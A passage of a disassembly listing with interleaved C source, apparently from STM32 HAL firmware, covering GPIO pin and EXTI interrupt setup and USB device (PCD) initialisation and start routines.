 8001c6e:	f043 0301 	orr.w	r3, r3, #1
 8001c72:	6613      	str	r3, [r2, #96]	; 0x60
 8001c74:	4b4f      	ldr	r3, [pc, #316]	; (8001db4 <HAL_GPIO_Init+0x2c0>)
 8001c76:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001c78:	f003 0301 	and.w	r3, r3, #1
 8001c7c:	60bb      	str	r3, [r7, #8]
 8001c7e:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001c80:	4a4d      	ldr	r2, [pc, #308]	; (8001db8 <HAL_GPIO_Init+0x2c4>)
 8001c82:	697b      	ldr	r3, [r7, #20]
 8001c84:	089b      	lsrs	r3, r3, #2
 8001c86:	3302      	adds	r3, #2
 8001c88:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001c8c:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001c8e:	697b      	ldr	r3, [r7, #20]
 8001c90:	f003 0303 	and.w	r3, r3, #3
 8001c94:	009b      	lsls	r3, r3, #2
 8001c96:	220f      	movs	r2, #15
 8001c98:	fa02 f303 	lsl.w	r3, r2, r3
 8001c9c:	43db      	mvns	r3, r3
 8001c9e:	693a      	ldr	r2, [r7, #16]
 8001ca0:	4013      	ands	r3, r2
 8001ca2:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001ca4:	687b      	ldr	r3, [r7, #4]
 8001ca6:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001caa:	d00d      	beq.n	8001cc8 <HAL_GPIO_Init+0x1d4>
 8001cac:	687b      	ldr	r3, [r7, #4]
 8001cae:	4a43      	ldr	r2, [pc, #268]	; (8001dbc <HAL_GPIO_Init+0x2c8>)
 8001cb0:	4293      	cmp	r3, r2
 8001cb2:	d007      	beq.n	8001cc4 <HAL_GPIO_Init+0x1d0>
 8001cb4:	687b      	ldr	r3, [r7, #4]
 8001cb6:	4a42      	ldr	r2, [pc, #264]	; (8001dc0 <HAL_GPIO_Init+0x2cc>)
 8001cb8:	4293      	cmp	r3, r2
 8001cba:	d101      	bne.n	8001cc0 <HAL_GPIO_Init+0x1cc>
 8001cbc:	2302      	movs	r3, #2
 8001cbe:	e004      	b.n	8001cca <HAL_GPIO_Init+0x1d6>
 8001cc0:	2307      	movs	r3, #7
 8001cc2:	e002      	b.n	8001cca <HAL_GPIO_Init+0x1d6>
 8001cc4:	2301      	movs	r3, #1
 8001cc6:	e000      	b.n	8001cca <HAL_GPIO_Init+0x1d6>
 8001cc8:	2300      	movs	r3, #0
 8001cca:	697a      	ldr	r2, [r7, #20]
 8001ccc:	f002 0203 	and.w	r2, r2, #3
 8001cd0:	0092      	lsls	r2, r2, #2
 8001cd2:	4093      	lsls	r3, r2
 8001cd4:	693a      	ldr	r2, [r7, #16]
 8001cd6:	4313      	orrs	r3, r2
 8001cd8:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001cda:	4937      	ldr	r1, [pc, #220]	; (8001db8 <HAL_GPIO_Init+0x2c4>)
 8001cdc:	697b      	ldr	r3, [r7, #20]
 8001cde:	089b      	lsrs	r3, r3, #2
 8001ce0:	3302      	adds	r3, #2
 8001ce2:	693a      	ldr	r2, [r7, #16]
 8001ce4:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001ce8:	4b36      	ldr	r3, [pc, #216]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001cea:	689b      	ldr	r3, [r3, #8]
 8001cec:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001cee:	68fb      	ldr	r3, [r7, #12]
 8001cf0:	43db      	mvns	r3, r3
 8001cf2:	693a      	ldr	r2, [r7, #16]
 8001cf4:	4013      	ands	r3, r2
 8001cf6:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001cf8:	683b      	ldr	r3, [r7, #0]
 8001cfa:	685b      	ldr	r3, [r3, #4]
 8001cfc:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001d00:	2b00      	cmp	r3, #0
 8001d02:	d003      	beq.n	8001d0c <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001d04:	693a      	ldr	r2, [r7, #16]
 8001d06:	68fb      	ldr	r3, [r7, #12]
 8001d08:	4313      	orrs	r3, r2
 8001d0a:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001d0c:	4a2d      	ldr	r2, [pc, #180]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001d0e:	693b      	ldr	r3, [r7, #16]
 8001d10:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001d12:	4b2c      	ldr	r3, [pc, #176]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001d14:	68db      	ldr	r3, [r3, #12]
 8001d16:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d18:	68fb      	ldr	r3, [r7, #12]
 8001d1a:	43db      	mvns	r3, r3
 8001d1c:	693a      	ldr	r2, [r7, #16]
 8001d1e:	4013      	ands	r3, r2
 8001d20:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001d22:	683b      	ldr	r3, [r7, #0]
 8001d24:	685b      	ldr	r3, [r3, #4]
 8001d26:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001d2a:	2b00      	cmp	r3, #0
 8001d2c:	d003      	beq.n	8001d36 <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001d2e:	693a      	ldr	r2, [r7, #16]
 8001d30:	68fb      	ldr	r3, [r7, #12]
 8001d32:	4313      	orrs	r3, r2
 8001d34:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001d36:	4a23      	ldr	r2, [pc, #140]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001d38:	693b      	ldr	r3, [r7, #16]
 8001d3a:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001d3c:	4b21      	ldr	r3, [pc, #132]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001d3e:	685b      	ldr	r3, [r3, #4]
 8001d40:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d42:	68fb      	ldr	r3, [r7, #12]
 8001d44:	43db      	mvns	r3, r3
 8001d46:	693a      	ldr	r2, [r7, #16]
 8001d48:	4013      	ands	r3, r2
 8001d4a:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001d4c:	683b      	ldr	r3, [r7, #0]
 8001d4e:	685b      	ldr	r3, [r3, #4]
 8001d50:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001d54:	2b00      	cmp	r3, #0
 8001d56:	d003      	beq.n	8001d60 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001d58:	693a      	ldr	r2, [r7, #16]
 8001d5a:	68fb      	ldr	r3, [r7, #12]
 8001d5c:	4313      	orrs	r3, r2
 8001d5e:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001d60:	4a18      	ldr	r2, [pc, #96]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001d62:	693b      	ldr	r3, [r7, #16]
 8001d64:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001d66:	4b17      	ldr	r3, [pc, #92]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001d68:	681b      	ldr	r3, [r3, #0]
 8001d6a:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001d6c:	68fb      	ldr	r3, [r7, #12]
 8001d6e:	43db      	mvns	r3, r3
 8001d70:	693a      	ldr	r2, [r7, #16]
 8001d72:	4013      	ands	r3, r2
 8001d74:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001d76:	683b      	ldr	r3, [r7, #0]
 8001d78:	685b      	ldr	r3, [r3, #4]
 8001d7a:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001d7e:	2b00      	cmp	r3, #0
 8001d80:	d003      	beq.n	8001d8a <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001d82:	693a      	ldr	r2, [r7, #16]
 8001d84:	68fb      	ldr	r3, [r7, #12]
 8001d86:	4313      	orrs	r3, r2
 8001d88:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001d8a:	4a0e      	ldr	r2, [pc, #56]	; (8001dc4 <HAL_GPIO_Init+0x2d0>)
 8001d8c:	693b      	ldr	r3, [r7, #16]
 8001d8e:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001d90:	697b      	ldr	r3, [r7, #20]
 8001d92:	3301      	adds	r3, #1
 8001d94:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001d96:	683b      	ldr	r3, [r7, #0]
 8001d98:	681a      	ldr	r2, [r3, #0]
 8001d9a:	697b      	ldr	r3, [r7, #20]
 8001d9c:	fa22 f303 	lsr.w	r3, r2, r3
 8001da0:	2b00      	cmp	r3, #0
 8001da2:	f47f aeaf 	bne.w	8001b04 <HAL_GPIO_Init+0x10>
  }
}
 8001da6:	bf00      	nop
 8001da8:	bf00      	nop
 8001daa:	371c      	adds	r7, #28
 8001dac:	46bd      	mov	sp, r7
 8001dae:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001db2:	4770      	bx	lr
 8001db4:	40021000 	.word	0x40021000
 8001db8:	40010000 	.word	0x40010000
 8001dbc:	48000400 	.word	0x48000400
 8001dc0:	48000800 	.word	0x48000800
 8001dc4:	40010400 	.word	0x40010400

08001dc8 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001dc8:	b480      	push	{r7}
 8001dca:	b083      	sub	sp, #12
 8001dcc:	af00      	add	r7, sp, #0
 8001dce:	6078      	str	r0, [r7, #4]
 8001dd0:	460b      	mov	r3, r1
 8001dd2:	807b      	strh	r3, [r7, #2]
 8001dd4:	4613      	mov	r3, r2
 8001dd6:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001dd8:	787b      	ldrb	r3, [r7, #1]
 8001dda:	2b00      	cmp	r3, #0
 8001ddc:	d003      	beq.n	8001de6 <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001dde:	887a      	ldrh	r2, [r7, #2]
 8001de0:	687b      	ldr	r3, [r7, #4]
 8001de2:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001de4:	e002      	b.n	8001dec <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001de6:	887a      	ldrh	r2, [r7, #2]
 8001de8:	687b      	ldr	r3, [r7, #4]
 8001dea:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001dec:	bf00      	nop
 8001dee:	370c      	adds	r7, #12
 8001df0:	46bd      	mov	sp, r7
 8001df2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001df6:	4770      	bx	lr

08001df8 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001df8:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001dfa:	b08b      	sub	sp, #44	; 0x2c
 8001dfc:	af06      	add	r7, sp, #24
 8001dfe:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001e00:	687b      	ldr	r3, [r7, #4]
 8001e02:	2b00      	cmp	r3, #0
 8001e04:	d101      	bne.n	8001e0a <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001e06:	2301      	movs	r3, #1
 8001e08:	e0f8      	b.n	8001ffc <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001e0a:	687b      	ldr	r3, [r7, #4]
 8001e0c:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001e10:	b2db      	uxtb	r3, r3
 8001e12:	2b00      	cmp	r3, #0
 8001e14:	d106      	bne.n	8001e24 <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001e16:	687b      	ldr	r3, [r7, #4]
 8001e18:	2200      	movs	r2, #0
 8001e1a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001e1e:	6878      	ldr	r0, [r7, #4]
 8001e20:	f00a fde4 	bl	800c9ec <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001e24:	687b      	ldr	r3, [r7, #4]
 8001e26:	2203      	movs	r2, #3
 8001e28:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001e2c:	687b      	ldr	r3, [r7, #4]
 8001e2e:	681b      	ldr	r3, [r3, #0]
 8001e30:	4618      	mov	r0, r3
 8001e32:	f004 f8d4 	bl	8005fde <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001e36:	687b      	ldr	r3, [r7, #4]
 8001e38:	681b      	ldr	r3, [r3, #0]
 8001e3a:	603b      	str	r3, [r7, #0]
 8001e3c:	687e      	ldr	r6, [r7, #4]
 8001e3e:	466d      	mov	r5, sp
 8001e40:	f106 0410 	add.w	r4, r6, #16
 8001e44:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001e46:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001e48:	6823      	ldr	r3, [r4, #0]
 8001e4a:	602b      	str	r3, [r5, #0]
 8001e4c:	1d33      	adds	r3, r6, #4
 8001e4e:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001e50:	6838      	ldr	r0, [r7, #0]
 8001e52:	f004 f89c 	bl	8005f8e <USB_CoreInit>
 8001e56:	4603      	mov	r3, r0
 8001e58:	2b00      	cmp	r3, #0
 8001e5a:	d005      	beq.n	8001e68 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001e5c:	687b      	ldr	r3, [r7, #4]
 8001e5e:	2202      	movs	r2, #2
 8001e60:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001e64:	2301      	movs	r3, #1
 8001e66:	e0c9      	b.n	8001ffc <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001e68:	687b      	ldr	r3, [r7, #4]
 8001e6a:	681b      	ldr	r3, [r3, #0]
 8001e6c:	2100      	movs	r1, #0
 8001e6e:	4618      	mov	r0, r3
 8001e70:	f004 f8d0 	bl	8006014 <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001e74:	2300      	movs	r3, #0
 8001e76:	73fb      	strb	r3, [r7, #15]
 8001e78:	e040      	b.n	8001efc <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001e7a:	7bfb      	ldrb	r3, [r7, #15]
 8001e7c:	6879      	ldr	r1, [r7, #4]
 8001e7e:	1c5a      	adds	r2, r3, #1
 8001e80:	4613      	mov	r3, r2
 8001e82:	009b      	lsls	r3, r3, #2
 8001e84:	4413      	add	r3, r2
 8001e86:	00db      	lsls	r3, r3, #3
 8001e88:	440b      	add	r3, r1
 8001e8a:	3301      	adds	r3, #1
 8001e8c:	2201      	movs	r2, #1
 8001e8e:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001e90:	7bfb      	ldrb	r3, [r7, #15]
 8001e92:	6879      	ldr	r1, [r7, #4]
 8001e94:	1c5a      	adds	r2, r3, #1
 8001e96:	4613      	mov	r3, r2
 8001e98:	009b      	lsls	r3, r3, #2
 8001e9a:	4413      	add	r3, r2
 8001e9c:	00db      	lsls	r3, r3, #3
 8001e9e:	440b      	add	r3, r1
 8001ea0:	7bfa      	ldrb	r2, [r7, #15]
 8001ea2:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001ea4:	7bfb      	ldrb	r3, [r7, #15]
 8001ea6:	6879      	ldr	r1, [r7, #4]
 8001ea8:	1c5a      	adds	r2, r3, #1
 8001eaa:	4613      	mov	r3, r2
 8001eac:	009b      	lsls	r3, r3, #2
 8001eae:	4413      	add	r3, r2
 8001eb0:	00db      	lsls	r3, r3, #3
 8001eb2:	440b      	add	r3, r1
 8001eb4:	3303      	adds	r3, #3
 8001eb6:	2200      	movs	r2, #0
 8001eb8:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001eba:	7bfa      	ldrb	r2, [r7, #15]
 8001ebc:	6879      	ldr	r1, [r7, #4]
 8001ebe:	4613      	mov	r3, r2
 8001ec0:	009b      	lsls	r3, r3, #2
 8001ec2:	4413      	add	r3, r2
 8001ec4:	00db      	lsls	r3, r3, #3
 8001ec6:	440b      	add	r3, r1
 8001ec8:	3338      	adds	r3, #56	; 0x38
 8001eca:	2200      	movs	r2, #0
 8001ecc:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001ece:	7bfa      	ldrb	r2, [r7, #15]
 8001ed0:	6879      	ldr	r1, [r7, #4]
 8001ed2:	4613      	mov	r3, r2
 8001ed4:	009b      	lsls	r3, r3, #2
 8001ed6:	4413      	add	r3, r2
 8001ed8:	00db      	lsls	r3, r3, #3
 8001eda:	440b      	add	r3, r1
 8001edc:	333c      	adds	r3, #60	; 0x3c
 8001ede:	2200      	movs	r2, #0
 8001ee0:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001ee2:	7bfa      	ldrb	r2, [r7, #15]
 8001ee4:	6879      	ldr	r1, [r7, #4]
 8001ee6:	4613      	mov	r3, r2
 8001ee8:	009b      	lsls	r3, r3, #2
 8001eea:	4413      	add	r3, r2
 8001eec:	00db      	lsls	r3, r3, #3
 8001eee:	440b      	add	r3, r1
 8001ef0:	3340      	adds	r3, #64	; 0x40
 8001ef2:	2200      	movs	r2, #0
 8001ef4:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001ef6:	7bfb      	ldrb	r3, [r7, #15]
 8001ef8:	3301      	adds	r3, #1
 8001efa:	73fb      	strb	r3, [r7, #15]
 8001efc:	7bfa      	ldrb	r2, [r7, #15]
 8001efe:	687b      	ldr	r3, [r7, #4]
 8001f00:	685b      	ldr	r3, [r3, #4]
 8001f02:	429a      	cmp	r2, r3
 8001f04:	d3b9      	bcc.n	8001e7a <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001f06:	2300      	movs	r3, #0
 8001f08:	73fb      	strb	r3, [r7, #15]
 8001f0a:	e044      	b.n	8001f96 <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001f0c:	7bfa      	ldrb	r2, [r7, #15]
 8001f0e:	6879      	ldr	r1, [r7, #4]
 8001f10:	4613      	mov	r3, r2
 8001f12:	009b      	lsls	r3, r3, #2
 8001f14:	4413      	add	r3, r2
 8001f16:	00db      	lsls	r3, r3, #3
 8001f18:	440b      	add	r3, r1
 8001f1a:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001f1e:	2200      	movs	r2, #0
 8001f20:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001f22:	7bfa      	ldrb	r2, [r7, #15]
 8001f24:	6879      	ldr	r1, [r7, #4]
 8001f26:	4613      	mov	r3, r2
 8001f28:	009b      	lsls	r3, r3, #2
 8001f2a:	4413      	add	r3, r2
 8001f2c:	00db      	lsls	r3, r3, #3
 8001f2e:	440b      	add	r3, r1
 8001f30:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001f34:	7bfa      	ldrb	r2, [r7, #15]
 8001f36:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001f38:	7bfa      	ldrb	r2, [r7, #15]
 8001f3a:	6879      	ldr	r1, [r7, #4]
 8001f3c:	4613      	mov	r3, r2
 8001f3e:	009b      	lsls	r3, r3, #2
 8001f40:	4413      	add	r3, r2
 8001f42:	00db      	lsls	r3, r3, #3
 8001f44:	440b      	add	r3, r1
 8001f46:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001f4a:	2200      	movs	r2, #0
 8001f4c:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001f4e:	7bfa      	ldrb	r2, [r7, #15]
 8001f50:	6879      	ldr	r1, [r7, #4]
 8001f52:	4613      	mov	r3, r2
 8001f54:	009b      	lsls	r3, r3, #2
 8001f56:	4413      	add	r3, r2
 8001f58:	00db      	lsls	r3, r3, #3
 8001f5a:	440b      	add	r3, r1
 8001f5c:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001f60:	2200      	movs	r2, #0
 8001f62:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001f64:	7bfa      	ldrb	r2, [r7, #15]
 8001f66:	6879      	ldr	r1, [r7, #4]
 8001f68:	4613      	mov	r3, r2
 8001f6a:	009b      	lsls	r3, r3, #2
 8001f6c:	4413      	add	r3, r2
 8001f6e:	00db      	lsls	r3, r3, #3
 8001f70:	440b      	add	r3, r1
 8001f72:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001f76:	2200      	movs	r2, #0
 8001f78:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001f7a:	7bfa      	ldrb	r2, [r7, #15]
 8001f7c:	6879      	ldr	r1, [r7, #4]
 8001f7e:	4613      	mov	r3, r2
 8001f80:	009b      	lsls	r3, r3, #2
 8001f82:	4413      	add	r3, r2
 8001f84:	00db      	lsls	r3, r3, #3
 8001f86:	440b      	add	r3, r1
 8001f88:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001f8c:	2200      	movs	r2, #0
 8001f8e:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001f90:	7bfb      	ldrb	r3, [r7, #15]
 8001f92:	3301      	adds	r3, #1
 8001f94:	73fb      	strb	r3, [r7, #15]
 8001f96:	7bfa      	ldrb	r2, [r7, #15]
 8001f98:	687b      	ldr	r3, [r7, #4]
 8001f9a:	685b      	ldr	r3, [r3, #4]
 8001f9c:	429a      	cmp	r2, r3
 8001f9e:	d3b5      	bcc.n	8001f0c <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001fa0:	687b      	ldr	r3, [r7, #4]
 8001fa2:	681b      	ldr	r3, [r3, #0]
 8001fa4:	603b      	str	r3, [r7, #0]
 8001fa6:	687e      	ldr	r6, [r7, #4]
 8001fa8:	466d      	mov	r5, sp
 8001faa:	f106 0410 	add.w	r4, r6, #16
 8001fae:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001fb0:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001fb2:	6823      	ldr	r3, [r4, #0]
 8001fb4:	602b      	str	r3, [r5, #0]
 8001fb6:	1d33      	adds	r3, r6, #4
 8001fb8:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001fba:	6838      	ldr	r0, [r7, #0]
 8001fbc:	f004 f837 	bl	800602e <USB_DevInit>
 8001fc0:	4603      	mov	r3, r0
 8001fc2:	2b00      	cmp	r3, #0
 8001fc4:	d005      	beq.n	8001fd2 <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001fc6:	687b      	ldr	r3, [r7, #4]
 8001fc8:	2202      	movs	r2, #2
 8001fca:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001fce:	2301      	movs	r3, #1
 8001fd0:	e014      	b.n	8001ffc <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001fd2:	687b      	ldr	r3, [r7, #4]
 8001fd4:	2200      	movs	r2, #0
 8001fd6:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001fda:	687b      	ldr	r3, [r7, #4]
 8001fdc:	2201      	movs	r2, #1
 8001fde:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001fe2:	687b      	ldr	r3, [r7, #4]
 8001fe4:	69db      	ldr	r3, [r3, #28]
 8001fe6:	2b01      	cmp	r3, #1
 8001fe8:	d102      	bne.n	8001ff0 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001fea:	6878      	ldr	r0, [r7, #4]
 8001fec:	f001 fc9e 	bl	800392c <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001ff0:	687b      	ldr	r3, [r7, #4]
 8001ff2:	681b      	ldr	r3, [r3, #0]
 8001ff4:	4618      	mov	r0, r3
 8001ff6:	f006 fadf 	bl	80085b8 <USB_DevDisconnect>

  return HAL_OK;
 8001ffa:	2300      	movs	r3, #0
}
 8001ffc:	4618      	mov	r0, r3
 8001ffe:	3714      	adds	r7, #20
 8002000:	46bd      	mov	sp, r7
 8002002:	bdf0      	pop	{r4, r5, r6, r7, pc}

08002004 <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8002004:	b580      	push	{r7, lr}
 8002006:	b082      	sub	sp, #8
 8002008:	af00      	add	r7, sp, #0
 800200a:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 800200c:	687b      	ldr	r3, [r7, #4]
 800200e:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002012:	2b01      	cmp	r3, #1
 8002014:	d101      	bne.n	800201a <HAL_PCD_Start+0x16>
 8002016:	2302      	movs	r3, #2
 8002018:	e012      	b.n	8002040 <HAL_PCD_Start+0x3c>
 800201a:	687b      	ldr	r3, [r7, #4]
 800201c:	2201      	movs	r2, #1
 800201e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8002022:	687b      	ldr	r3, [r7, #4]
 8002024:	681b      	ldr	r3, [r3, #0]
 8002026:	4618      	mov	r0, r3
 8002028:	f003 ffc2 	bl	8005fb0 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 800202c:	687b      	ldr	r3, [r7, #4]
 800202e:	681b      	ldr	r3, [r3, #0]
 8002030:	4618      	mov	r0, r3
 8002032:	f006 faaa 	bl	800858a <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8002036:	687b      	ldr	r3, [r7, #4]
 8002038:	2200      	movs	r2, #0
 800203a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800203e:	2300      	movs	r3, #0
}
 8002040:	4618      	mov	r0, r3
 8002042:	3708      	adds	r7, #8
 8002044:	46bd      	mov	sp, r7
 8002046:	bd80      	pop	{r7, pc}

08002048 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8002048:	b580      	push	{r7, lr}
 800204a:	b084      	sub	sp, #16
 800204c:	af00      	add	r7, sp, #0
 800204e:	6078      	str	r0, [r7, #4]
